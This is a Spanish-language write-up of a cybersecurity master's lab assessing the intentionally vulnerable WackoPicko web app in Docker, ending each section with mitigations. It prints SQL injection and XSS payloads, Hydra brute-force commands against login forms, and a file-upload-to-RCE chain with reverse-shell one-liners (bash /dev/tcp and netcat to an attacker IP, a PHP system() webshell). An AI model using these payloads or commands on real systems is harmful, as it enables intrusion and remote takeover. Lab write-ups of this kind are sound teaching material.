---
title: WackoPicko - Secure Development Final Project
excerpt: Comprehensive analysis and manual exploitation of vulnerabilities in the WackoPicko web application, including SQLi, XSS, LFI/RCE, and brute-force techniques.
categories:
  - Write-up
  - Web Security
  - Laboratory
tags:
  - methodology
  - SQLi
  - XSS
  - LFI
  - RCE
  - brute-force
  - BurpSuite
  - Hydra
  - security
  - docker
toc: true
toc_label: Report Content
toc_sticky: true
header:
  overlay_image: /assets/images/headers/wackopicko-banner.jpg
  overlay_filter: 0.7
og_image: /assets/images/headers/wackopicko-og.png
seo_title: WackoPicko - Secure Development Final Project
seo_description: Detailed report on the analysis and manual exploitation of vulnerabilities in the WackoPicko lab, focusing on SQL injection, XSS, LFI/RCE, brute-force attacks, and mitigation strategies.
author: Maxi Barcia
date: 2025-09-11
draft: false
---

![image-center](/assets/images/headers/wackopicko-banner.jpg)



## 💻 Proyecto Final: Desarrollo Seguro en WackoPicko

**Introducción**

Este es el proyecto final de la asignatura de **Desarrollo Seguro**, perteneciente al máster de "Ciberseguridad". El objetivo principal es realizar un análisis exhaustivo de la aplicación web **WackoPicko** para identificar, analizar y explotar sus vulnerabilidades.


#### Configuración del Entorno y Comandos de Docker

Para la ejecución del laboratorio **WackoPicko**, se utilizó un contenedor de **Docker** que facilita la instalación y aislamiento del entorno. A continuación se detallan los pasos y comandos principales:

**Repositorio del Proyecto:**  
[WackoPicko GitHub Repository](https://github.com/adamdoupe/WackoPicko?tab=readme-ov-file)  

**Comandos de Docker utilizados:**

1. **Clonar el repositorio:**
```bash
git clone https://github.com/<usuario>/WackoPicko.git
cd WackoPicko
docker build -t wackopicko:latest .
docker run -d -p 8888:80 --name wackopicko wackopicko:latest
docker ps
$Acceder al contenedor (opcional):   --->   docker exec -it wackopicko /bin/bash


# Detener y eliminar todos los contenedores activos
sudo docker stop $(sudo docker ps -q)
sudo docker rm $(sudo docker ps -a -q)

# Eliminar todas las imágenes
sudo docker rmi $(sudo docker images -q)

# Eliminar todos los volúmenes
sudo docker volume rm $(sudo docker volume ls -q)
Explicación:

sudo docker ps -q: lista solo los IDs de los contenedores en ejecución.

sudo docker ps -a -q: lista todos los contenedores, activos o detenidos.

sudo docker images -q: lista IDs de todas las imágenes.

sudo docker volume ls -q: lista IDs de todos los volúmenes.
```


## 📄 Informe Técnico – Evaluación de Seguridad en WackoPicko

### 0. Resumen Ejecutivo

Se realizó una **evaluación de seguridad controlada** sobre la aplicación vulnerable **WackoPicko**, desplegada en un entorno **Docker** y analizada desde **Kali Linux**.  
El objetivo fue **identificar debilidades en autenticación, validación de entradas y manejo de archivos**.

Durante el ejercicio se explotaron múltiples vectores que evidencian una **superficie de ataque crítica**.

#### Principales hallazgos

- 🔴 **Login de usuarios expuesto a fuerza bruta**  
    El formulario de login devuelve mensajes de error explícitos al introducir credenciales inválidas, facilitando ataques automatizados con Hydra/BurpSuite Intruder.    
- 🔴 **Login de administradores vulnerable a inferencia por longitud**  
    Aunque no se muestran mensajes de error, se observó una **respuesta fija de 266 bytes** en intentos fallidos. Esto permitió configurar ataques basados en el `content-length`, logrando identificar credenciales válidas.    
- 🔴 **Falta de validación en subida de archivos**  
    El sistema permite subir archivos sin restricciones adecuadas. Se pudo cargar un archivo **PHP malicioso** camuflado como imagen, el cual otorgó acceso a la ejecución de comandos en el servidor.    
- 🔴 **Ejecución Remota de Comandos (RCE)**  
    Mediante el archivo PHP malicioso, se consiguió ejecutar comandos arbitrarios en el servidor, obteniendo control completo del sistema. Este vector implica un **riesgo crítico** que compromete la confidencialidad, integridad y disponibilidad de toda la aplicación.
    

#### Riesgo principal

La combinación de:
- **Fuerza bruta en formularios de login**    
- **Subida insegura de archivos**    
- **Ejecución remota de comandos (RCE)**    

conduce a un **compromiso total del sistema**. Un atacante podría escalar privilegios, robar información sensible, modificar contenidos o pivotar hacia otros sistemas internos.

#### Recomendaciones clave

- **Autenticación**:    
    - Bloqueo de cuentas tras 3–5 intentos fallidos.        
    - Delays progresivos entre intentos.        
    - Integración de CAPTCHA/reCAPTCHA.        
    - Mensajes de error genéricos, sin información adicional.
        
- **Gestión de archivos**:
        - Validar extensión y tipo MIME de los archivos.        
    - Almacenar archivos en rutas fuera del directorio ejecutable del servidor web.        
    - Renombrar archivos subidos y aplicar whitelists.        
    - Implementar un sistema antivirus/antimalware en uploads.
    
- **Hardening general**:
    
    - Deshabilitar ejecución de código en directorios de uploads.        
    - Monitorizar logs para detectar intentos de abuso.        
    - Aplicar parches y actualizar dependencias.        
    - Revisar políticas de mínimos privilegios en el servidor.

---

### **Objetivo 1: Identificación de Vulnerabilidades**

Comando Docker utilizado: 
sudo docker run -d -p 127.0.0.1:8888:80 adamdoupe/wackopicko

El primer paso es utilizar herramientas semiautomáticas como **Burp Suite**, **Vega** y **Nikto** para escanear la aplicación y obtener un panorama general de sus fallas de seguridad.

#### Enumeracion y Escaneo con Burp Suite / Vega

Se realizó un escaneo automatizado con **Burp Suite / Vega** para identificar de manera masiva las vulnerabilidades presentes en la aplicación.


[VegaScan](/assets/images/headers/vega.png)
[BurpSuite](/assets/images/headers/burp.png)


El resultado del escaneo muestra la cantidad y el tipo de vulnerabilidades encontradas (Aproximado), clasificadas por su nivel de riesgo:

- **Vulnerabilidades de alto riesgo**: 13         
- **Vulnerabilidades de riesgo medio**: 125         
- **Vulnerabilidades de bajo riesgo**: 23         

#### Escaneo con Nikto

Se utilizó **Nikto** para una exploración más detallada, ya que esta herramienta se enfoca en la búsqueda de archivos y configuraciones inseguras.

- **Comando utilizado**: `nikto -h http://localhost:8888`        

El análisis de los resultados de Nikto reveló hallazgos críticos:
1. **Vulnerabilidad de Inclusión de Archivos (LFI/RFI)**: `+ /admin/index.php: PHP include error may indicate local or remote file inclusion is possible.` Esta es una pista crucial que sugiere que el parámetro `page` es vulnerable, lo que podría permitir la inclusión de archivos arbitrarios.     
    
2. **Inyección de Credenciales de Administrador**: `+ /admin/login.php?action=insert&username=test&password=test` Nikto identificó una vulnerabilidad en una versión antigua de `phpAuction` que podría permitir la creación de cuentas de administrador sin autenticación.     
    
3. **Archivos de Configuración Sensibles**: `+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.` Este hallazgo es muy importante, ya que un archivo de respaldo con credenciales de la base de datos está expuesto públicamente.     


#### Enumeración de Directorios con Gobuster

Antes de la explotación, se utilizó **Gobuster** para enumerar directorios y archivos, lo que ayudó a descubrir rutas ocultas.

- **Comando 1**: `sudo gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://localhost:8080 -t 20 --add-slash`         
- **Comando 2 (en el directorio /admin/)**: `sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://localhost:8888/admin/ -t 20 -x php,txt,html,php.bak,bak,tar`       

[Gobuster](/assets/images/headers/gobuster.png)


Los resultados mostraron la existencia de archivos como `index.php`, `login.php`, y `home.php` en el directorio `/admin/`. Además, se observó que `home.php` redirige a `/admin/index.php?page=login`.


---

## **Objetivo 2: Explotación de Vulnerabilidades**

Una vez identificadas las posibles fallas, se procedió a la explotación manual de las vulnerabilidades más relevantes.

---

### **Explotación de la Inyección SQL (SQLi)**

Se realizó la prueba en `http://127.0.0.1:8888/users/login.php`, introduciendo una comilla simple (`'`), generando el siguiente mensaje de error:

``You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' and `password` = SHA1( CONCAT('', `salt`)) limit 1' at line 1``

Se observa que aunque aparece el error de sintaxis, la verificación de la contraseña sigue en ejecución y se encripta con SHA1, evidenciando que el sistema no maneja correctamente la validación de entrada.

Los escaneos automáticos de **Vega** revelaron múltiples puntos de inyección SQL en la aplicación. Aunque el **error de sintaxis** constante sugería que un filtro de seguridad bloqueaba algunos comandos comunes, la vulnerabilidad persiste y se confirma mediante técnicas de **inyección ciega**.

---

#### 1. Formulario de Registro

El campo **`username`** en `/users/register.php` es vulnerable a inyección SQL. Esto permite:

- Manipular la base de datos mediante peticiones `POST`.
    
- Crear registros maliciosos o alterar datos existentes.
    
- Confirmación del hallazgo mediante escáner automático.
    

---

#### 2. Formulario de Inicio de Sesión

El campo **`username`** en `/users/login.php` también es vulnerable, lo que permite:

- Omitir la autenticación.
    
- Acceder a cuentas de usuario sin contraseña válida.
    

---

#### 3. Panel de Administración

Se detectó una vulnerabilidad de inyección SQL en el parámetro **`page`** de `/admin/index.php`. Esto permite:

- Insertar código malicioso mediante peticiones `GET`.
    
- Manipular la base de datos y obtener acceso a funciones administrativas.
    

Ejemplo de creación de usuario con **Vega**:  



[Creacion User Vega](/assets/images/headers/vega_user.png)


---

#### 4. Ejemplo de Exploit Manual

En `http://localhost:8888/users/login.php` se inyecta el siguiente payload:

`` `maxi` and '1'='1 ``

Esto provoca un error de sintaxis, pero evidencia que el sistema evalúa la consulta SQL sin filtrar correctamente:

[User panel](/assets/images/headers/usertest.png)

Posteriormente, se prueba el usuario creado con la inyección:

`maxi' --`

Consulta resultante:

`SELECT * FROM users WHERE (username='maxi' -- AND password='$pass');`

Captura del login exitoso:

[User Login](/assets/images/headers/userlogin.png)

---

#### 5. Fuerza Bruta de Usuarios

Se utilizó **Burp Suite - Intruder** para realizar fuerza bruta sobre los usuarios existentes. Resultados:

- **Usuarios encontrados**:    
    - wanda        
    - scanner1        
    - bryce        
    - bob        

Captura del proceso en Burp Suite:  
[User Login](/assets/images/headers/burpuser.png)

Comparación de acceso al panel:  
[scanner1 Login](/assets/images/headers/scanner1login.png)

---

#### 6. Enumeración de Usuarios

Se realizó enumeración de usuarios mediante:

`http://localhost:8888/users/view.php?userid=1`

Modificando el parámetro `userid` se obtienen diferentes usuarios: 
[scanner1 Login](/assets/images/headers/scanner2.png)

Fuerza bruta en usuarios obtenidos, logrando comprometer sus credenciales:  
[BruteForce User](/assets/images/headers/userbrute.png)


#### **Mitigación y Recomendaciones de SQL Injection**

Para corregir esta vulnerabilidad y prevenir futuros ataques, se recomienda:

1. **Uso de consultas parametrizadas / Prepared Statements**    
    - Emplear PDO o Prepared Statements en todas las consultas SQL.        
    - Separar la lógica SQL de los datos de entrada.
        
2. **Validación estricta de parámetros**    
    - Permitir únicamente caracteres válidos en `username` y `password`.        
    - Bloquear palabras reservadas y sensibles:        
        `schema, information_schema, union, select, drop, insert, update, delete`        
    - Evitar caracteres especiales que puedan modificar la consulta (`'`, `"`, `--`, `#`, `;`).
        
3. **Control de errores seguro**    
    - No mostrar errores SQL en el frontend.        
    - Manejar errores de forma genérica para no dar pistas a atacantes.
        
4. **Protecciones adicionales**    
    - Limitar intentos de login fallidos (ej: 5 intentos, luego delay progresivo).        
    - Implementar CAPTCHA / reCAPTCHA tras varios intentos fallidos.        
    - Bloqueo de cuenta temporal tras múltiples intentos consecutivos.
        
5. **Revisión y monitoreo**    
    - Auditar el código fuente y la base de datos.        
    - Revisar logs de acceso y detectar patrones de ataque automatizado.



-----
### **Fuerza Bruta con Hydra – Usuarios y Panel Admin**

**Objetivo:**  
Realizar ataques de fuerza bruta sobre cuentas de usuarios y el panel de administración en `127.0.0.1:8888` usando la herramienta **Hydra** para evaluar la resistencia de la aplicación frente a intentos masivos de acceso no autorizado.


#### 1. Fuerza Bruta sobre Usuario `bryce`

Se utilizó Hydra para comprobar credenciales del usuario _bryce_:

`hydra -l scanner1 -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8888 \ http-post-form "/users/login.php:username=^USER^&password=^PASS^:F=The username/password combination you have entered is invalid" -V`

**Explicación de parámetros:**

- `-l scanner1` → usuario conocido.    
- `-P /usr/share/wordlists/rockyou.txt` → diccionario de contraseñas.    
- `-s 8888` → puerto del servicio.    
- `http-post-form "/users/login.php:username=^USER^&password=^PASS^:F=..."` → formulario objetivo y condición de fallo.    
- `-V` → verbose, muestra cada intento.
    

[BruteForce User](/assets/images/headers/hydrabryce.png)

La captura muestra cómo Hydra detecta intentos fallidos según el mensaje de error devuelto por la aplicación.

---

#### 2. Fuerza Bruta sobre Panel Admin `/admin/index.php?page=login`

**Problema detectado:**  
El panel de administración **no muestra un mensaje de error claro** para logins inválidos. En el navegador, los campos se recargan en blanco sin indicar si el usuario o la contraseña son incorrectos.

**Confirmación en BurpSuite:**  
La longitud del contenido siempre es **266 bytes** ante un login fallido, lo que permite usar Hydra con condición de longitud:

[BruteForce User](/assets/images/headers/burprespon.png)

**Comando Hydra usando longitud de respuesta:**

`hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \ -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8888 \ http-post-form "/admin/index.php?page=login:adminname=^USER^&password=^PASS^:F=266" -V`

**Comando Hydra alternativo usando patrón de contenido fijo:**

`hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \ -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8888 \ http-post-form "/admin/index.php?page=login:adminname=^USER^&password=^PASS^:S=Username" -V`

**Notas:**

- `-L` → Lista de usuarios.    
- `-P` → Lista de contraseñas.    
- `-s 8888` → Puerto del servicio.    
- `F=266` → Fallo detectado por longitud de respuesta.    
- `S=Username` → Patrón de contenido para fallo, más estable que longitud.    
- `-V` → Modo verbose.    

[BruteForce User](/assets/images/headers/hydrabryce.png)

Esta captura muestra el proceso de fuerza bruta en consola y cómo Hydra detecta logins correctos a partir de la condición de fallo definida.

---

#### 3. Resultados combinados
- Se comprobó que los usuarios identificados previamente mediante inyección SQL (`wanda`, `scanner1`, `bryce`, `bob`) podían ser atacados mediante fuerza bruta automatizada.    
- El panel de administración también es vulnerable a ataques por fuerza bruta debido a la ausencia de mecanismos de bloqueo y mensajes de error genéricos.
    

---

#### 4. Recomendaciones de seguridad frente a fuerza bruta

1. **Límites de intentos:**    
    - Permitir un máximo de 5 intentos fallidos consecutivos por usuario.        
    - Implementar retrasos progresivos (“cooldown”) entre intentos.
        
2. **CAPTCHA / reCaptcha:**    
    - Integrar un mecanismo de validación humano tras 2-3 intentos fallidos.
        
3. **Bloqueo temporal o notificación:**    
    - Tras 3-5 intentos fallidos, bloquear la cuenta temporalmente y notificar al usuario o al equipo de seguridad.
        
4. **Mensajes de error genéricos:**    
    - Evitar mensajes que revelen si el usuario o la contraseña son incorrectos por separado. Usar: “Usuario o contraseña incorrectos”.
        
5. **Registro y monitoreo de intentos:**    
    - Registrar todos los intentos fallidos y generar alertas si se detectan patrones de ataque.
        
6. **Política de contraseñas robustas:**    
    - Obligar a contraseñas complejas y de longitud mínima, reduciendo la efectividad de ataques por diccionario.

---


### **Explotación de Cross-Site Scripting (XSS)**

Durante la evaluación se identificó una vulnerabilidad de **XSS reflejado** en el campo de búsqueda de la página:

- **URL afectada**: `/pinctures/search.php`    
- **Payload utilizado**:

`<script>alert("XSS")</script>`

[XSS Alert](/assets/images/headers/xssalert1.png)

Al ejecutar este _payload_, se confirmó la ejecución de código JavaScript en el navegador de la víctima, evidenciando la falta de saneamiento de entradas.

Se identificaron **otras tres vulnerabilidades XSS** adicionales en las siguientes páginas:

- `/users/login.php`    
- `/pinctures/search.php`    
- `/guestbook.php`    

Estas vulnerabilidades podrían permitir la ejecución de scripts maliciosos en el navegador del usuario, robo de cookies o sesiones, y ataques de redirección no autorizada.

---

#### **Conclusiones y Recomendaciones Generales**

El análisis de **WackoPicko** reveló múltiples vulnerabilidades críticas que, en conjunto, podrían permitir un compromiso total del sistema.

**Recomendaciones para mejorar la seguridad de la aplicación:**
1. **Validación y Saneamiento de Entradas:**    
    - Implementar validación estricta en todos los parámetros de entrada y formularios.        
    - Escapar correctamente caracteres especiales para prevenir **SQLi** y **XSS**.        
    - 
2. **Manejo Seguro de Archivos:**    
    - No confiar únicamente en la extensión del archivo.        
    - Validar _magic bytes_ y usar listas blancas de extensiones permitidas.        
    - Almacenar archivos en directorios no ejecutables por el servidor web para prevenir ejecución remota de código.
        
3. **Gestión de Cuentas y Contraseñas:**    
    - Implementar políticas de contraseñas fuertes y complejas.        
    - Bloquear cuentas tras varios intentos fallidos.        
    - Usar mensajes de error genéricos que no revelen información sensible.
    
    4. **Actualizaciones y Parcheo:**    
    - Mantener todas las dependencias, librerías y software del servidor actualizados.        
    - Aplicar parches de seguridad de manera regular para mitigar vulnerabilidades conocidas.
        
4. **Monitoreo y Registro de Actividad:**    
    - Registrar eventos críticos y accesos sospechosos.        
    - Implementar alertas automáticas ante patrones anómalos que puedan indicar intentos de explotación.


---









#### Vulnerabilidad de Inclusión de Archivos y Ejecución Remota de Código (**LFI**/**RCE**)

La vulnerabilidad más crítica encontrada fue la **inclusión de archivos locales (LFI)** en la función de carga de imágenes, que permitió la ejecución de código remoto.

- **Prueba de Concepto Inicial**: Se inyectó un `webshell` básico de PHP en un archivo `.jpg` y se subió al servidor. Al acceder a la URL, se pudo ejecutar un comando del sistema (`cat /etc/passwd`), confirmando la vulnerabilidad.
    
- **Obtención de una Reverse Shell**: Debido a que la `shell` inicial era no interactiva y el servidor carecía de herramientas como `curl` o `wget`, se utilizó una técnica de transferencia de archivos con `netcat`. Primero, se envió un _payload_ de `bash` a `/tmp/shell.sh` del servidor. Posteriormente, se ejecutó el archivo desde la URL, lo que finalmente proporcionó una `reverse shell` interactiva. Esto demostró que, a pesar de las limitaciones del sistema, fue posible obtener un control total del servidor como el usuario `www-data`.
    

Se intentó explotar la vulnerabilidad de LFI identificada por Nikto, Burpsuite y Vega, utilizando los siguientes payloads:

1. `http://localhost:8888/admin/?page=../../../../../etc/passwd%00`
    
2. `http://localhost:8888/admin/?page=../../../../../etc/passwd/./`
    

Luego de navegar como el usuario `bob`, se identificó una vulnerabilidad de **inclusión de archivos locales (LFI)** en la función de carga de imágenes de la aplicación, permitiendo la inyección y ejecución de código malicioso.

---

##### **1. Detección y Prueba de Concepto**

La vulnerabilidad fue descubierta al subir una imagen cuyo contenido fue modificado en **Burp Suite**. En lugar de datos de imagen, se inyectó un _webshell_ con el siguiente flujo:

- **Petición interceptada:** La subida del archivo fue interceptada con Burp Suite.
    
- **Modificación:** Se cambió el tipo de contenido de `image/jpeg` a `application/x-php` y se reemplazaron los datos binarios de la imagen con código PHP malicioso.
    
- **Ejecución:** Se accedió al archivo a través de la URL, pasando comandos como parámetro.
    

**Ejemplo de prueba de ejecución:**

- Comando para ver `/etc/passwd`:  
- [CMD codigo](/assets/images/headers/cmdphp.png)
- [Cat /etc/passwd](/assets/images/headers/catetc.png)
    

---

##### **2. Consecuencias**

- **Ejecución de comandos arbitrarios** en el servidor.
    
- **Obtención de reverse shell**, logrando control completo del sistema como `www-data`.
    
- **Compromiso total del sistema**, incluyendo bases de datos y archivos, con posibilidad de pivotar hacia otros sistemas.
    

---

##### **3. Exploits y Comandos Usados**

- Subida de archivos maliciosos vía Burp Suite.    
- Transferencia de payload con `nc` y ejecución remota.    
- Cambio de permisos con `chmod` para ejecutar scripts en `/tmp/`.    
- Reverse shell interactiva a máquina atacante por puerto 4444.    

Ejemplos de comandos ejecutados:

```json
sudo nc -lvnp 444 < shell.php -----------> Desde mi maquina atacante en escucha por el puerto 444
localhost:8888/upload/hola.jpg/hola.php?cmd=nc 192.168.0.17 444 > /tmp/shell.sh -----------> desde el URL del cmd subido llamado al archivo .sh por el puerto 444
localhost:8888/upload/hola.php/hola.php?cmd=chmod +x /tmp/shell.sh ----------->  Desde el URL del cmd subido dando permisos de ejecucion
sudo nc -lvnp 4444                                                 ----------->  Desde mi maquina atacante en escucha por el puerto 4444
localhost:8888/upload/hola.php/hola.php?cmd=bash /tmp/shell.sh  ----------->  Desde el URL del cmd subido ejecutar script para recibir la rev shell
					#!/bin/bash bash -i >& /dev/tcp/192.168.0.17/4444 0>&1   ----------->  Contenido de shell.php 
-------------------> El url que se envia luego del cmd= debe estar codificado en HEX
```

Ejemplo de payloads utilizados en el url cmd como parametros:

```json
bash+-c+%22bash+-i+%3E%26+/dev/tcp/192.168.0.17/4444+0%3E%261%22

bash -i >& /dev/tcp/192.168.0.17/4444 0>&1

bash -i >%26 /dev/tcp/192.168.0.17/4444 0>%261

cmd=bash%20-i%20%3E%26%20/dev/tcp/192.168.0.17/4444%200%3E%261

<?php system("bash -i >& /dev/tcp/192.168.0.17/4444 0>&1"); ?>

localhost:8888/upload/hola.jpg/hola.php?cmd=nc%20192.168.0.17%208000%20%3E%20/tmp/shell.sh

http://localhost:8888/upload/hola.php/hola.php?cmd=bash%20-i%20%3E%26%20/dev/tcp/192.168.0.17/4444%200%3E%261

localhost:8888/upload/shell1.php/shell.php?cmd=bash%20-i%20>%26%20/dev/tcp/192.168.0.17/4444%200>%261

```

- **Captura de reverse shell interactiva** mostrando IP y usuario `www-data`:     
[RevShell](/assets/images/headers/shellrev.png)
    
- Recursos de pruebas adicionales: [Revshells](https://www.revshells.com/)    
- Varias pruebas con payloads de bash y PHP, usando rutas y comandos URL codificados.    

Contenido del arhcivo PHP subido para entablar conexion:
[Code php Reverse](/assets/images/headers/phpcoderever.png)

##### **4. Recomendaciones y Mitigaciones**

- **Validación estricta de archivos:** Comprobar extensión (`.jpg`, `.png`, `.gif`) y _magic bytes_.    
- **Protección de carpeta de subida:** No permitir ejecución de scripts; renombrar archivos con hashes o nombres aleatorios.    
- **Filtrado de caracteres peligrosos:** Evitar `../`, `%2F` y otros caracteres que permitan LFI/RCE.    
- **Seguridad de configuraciones y backups:** Evitar exposición pública.    
- **Actualización de software y dependencias:** Evitar vulnerabilidades conocidas.    
- **Monitoreo y registro:** Registrar accesos y alertar ante patrones de ataque.